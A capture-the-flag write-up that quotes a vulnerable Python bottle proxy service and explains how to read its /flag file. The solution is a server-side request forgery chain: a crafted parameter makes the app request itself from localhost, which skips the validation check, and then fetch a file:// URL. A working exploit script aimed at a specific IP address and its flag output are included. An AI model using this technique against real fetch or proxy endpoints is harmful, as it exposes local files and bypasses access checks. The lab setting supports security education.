# chal3

## Description

We are given a URL to a website which displays its own source:

```python
import string
import urllib2
from bottle import route, run, post, get, request

@get('/')
def index():
    with open(__file__) as f:
        return '<pre>' + "".join({'<':'&lt;','>':'&gt;'}.get(c,c) for c in f.read()) + '</pre>'


@post('/isup')
@get('/isup')
def isup():
    try:
        name = request.params.get('name', None)
        is_remote = request.environ.get('REMOTE_ADDR') != '127.0.0.1'
        is_valid = all(x in name for x in ['http', 'kuchenblech'])
        if is_remote and not is_valid:
            raise Exception
        result = urllib2.urlopen(name).read()
        return result
    except:
        return 'Error'

run(host='0.0.0.0', server="paste", port=8080, reloader=False)
```

The flag is supposed to be found in `/flag`.

## Analysis

The server is a simple proxy which will relay requests to URLs it finds valid. For a URL to be found valid it has to satisfy either of two requirements:

1. It has to come frome `127.0.0.1` - the local machine.
2. It has to contain the strings `http` and `kuchenblech` inside it.

The server also uses an older version of `urllib` which can resolve URLs using the `file://` scheme by default.

## Solution

The `file://` scheme doesn't support query parameters or other ways to include arbitrary text in the URL so the only way to request `file:///flag` is to make that request come from `localhost`. This is possible by fulfilling the second requirement and making the server send a request to itself.

A simple script can be used to aid with encoding request parameters:

```python
#!/usr/bin/env python3
import requests
import sys

path = sys.argv[1]

r = requests.get(
    f"http://108.61.211.185/isup",
    params={
        "name": f"http://localhost:8080/isup?kuchenblech&name=file://{path}"
    }
)

print(r.text)
```

```
$ ./fetch.py /flag
junior-double_or_noth1ng
```

